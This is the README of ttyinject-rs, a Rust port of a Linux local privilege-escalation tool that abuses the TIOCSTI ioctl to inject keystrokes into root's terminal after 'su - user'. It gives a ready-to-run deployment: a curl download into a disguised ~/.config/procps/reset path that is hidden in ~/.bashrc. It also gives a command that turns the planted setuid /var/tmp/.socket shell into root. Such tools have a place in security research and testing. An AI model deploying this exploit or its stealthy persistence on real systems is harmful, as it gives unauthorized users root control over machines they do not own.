# ttyinject-rs

[![](https://img.shields.io/github/stars/0xdea/ttyinject-rs.svg?style=flat&color=yellow)](https://github.com/0xdea/ttyinject-rs)
[![](https://img.shields.io/crates/v/ttyinject-rs?style=flat&color=green)](https://crates.io/crates/ttyinject-rs)
[![](https://img.shields.io/crates/d/ttyinject-rs?style=flat&color=red)](https://crates.io/crates/ttyinject-rs)
[![](https://img.shields.io/badge/twitter-%400xdea-blue.svg)](https://twitter.com/0xdea)
[![](https://img.shields.io/badge/mastodon-%40raptor-purple.svg)](https://infosec.exchange/@raptor)
[![build](https://github.com/0xdea/ttyinject-rs/actions/workflows/build.yml/badge.svg)](https://github.com/0xdea/ttyinject-rs/actions/workflows/build.yml)
[![release](https://github.com/0xdea/ttyinject-rs/actions/workflows/release.yml/badge.svg)](https://github.com/0xdea/ttyinject-rs/actions/workflows/release.yml)

> "Human beings do not like being forced into doing something, even if it is in their best interests."
>
> -- Charles Stross, Accelerando

A port of [@hackerschoice](https://github.com/hackerschoice)'s [ttyinject](https://github.com/hackerschoice/ttyinject) to Rust, created as a learning exercise. This simple tool abuses the `TIOCSTI` ioctl to inject keystrokes into a terminal exploiting a longstanding bug (feature?) in the Linux kernel.

![](https://raw.githubusercontent.com/0xdea/ttyinject-rs/master/.img/bug_vs_feature.jpg)

## What it does

Non-privileged user gets root privileges on Linux when root does `su - user`.

## How it works

Taken more or less verbatim from [ttyinject](https://github.com/hackerschoice/ttyinject)'s README:

- `su` does not allocate a new tty when switching to a non-privileged user.
- The non-privileged user can use `ioctl(0, TIOCSTI, ...)` to inject input into the root's shell prompt.
- The injected input copies `/bin/sh` to `/var/tmp/.socket` and `chmod +s` it.
- Executes only once (from non-privileged user's `~/.bashrc`). Deletes itself afterwards.

## See also

- <https://github.com/hackerschoice/ttyinject/>

## Usage

Deploy ttyinject-rs in the user's `~/.bashrc` as follows:

```sh
mkdir -p ~/.config/procps 2>/dev/null
curl -o ~/.config/procps/reset -fsSL "https://github.com/0xdea/ttyinject-rs/releases/latest/download/ttyinject-rs-linux-$(uname -m)" \
&& chmod 755 ~/.config/procps/reset \
&& if grep -qFm1 'procps/reset' ~/.bashrc; then echo >&2 "Already installed in ~/.bashrc"; else \
echo "$(head -n1 ~/.bashrc)"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 ~/.bashrc)" >~/.bashrc; fi
```

> [!TIP]
> Alternatively, you can build the binary via [crates.io](https://crates.io/crates/ttyinject-rs) with `cargo install ttyinject-rs`, use the library in your own projects with `cargo add ttyinject-rs`, or compile it from this source repository. For troubleshooting, you can run the binary in verbose by providing any argument to it.

Then, wait for root to execute `su - user` and thereafter gain root privileges with:

```sh
/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('/bin/bash', '-bash')\""
```

> [!NOTE]
> The binary will only execute once (and then delete itself), but you still need to clean up `~/.bashrc` and `/var/tmp/.socket`.

## Compatibility

Tested on Ubuntu Linux 24.04.4 LTS (6.17.0-35-generic #35~24.04.1-Ubuntu kernel) aarch64 with `dev.tty.legacy_tiocsti` explicitly enabled.

> [!IMPORTANT]
> Since Linux 6.2, `TIOCSTI` may require the `CAP_SYS_ADMIN` capability (if the `dev.tty.legacy_tiocsti` sysctl variable is set to `false`).

## Credits

- [@hackerschoice](https://github.com/hackerschoice) for their <https://github.com/hackerschoice/ttyinject>

## Changelog

- [CHANGELOG.md](https://github.com/0xdea/ttyinject-rs/blob/master/CHANGELOG.md)

## TODO

- Implement arguments (e.g., custom command and number of screen lines to clear) for advanced usage.
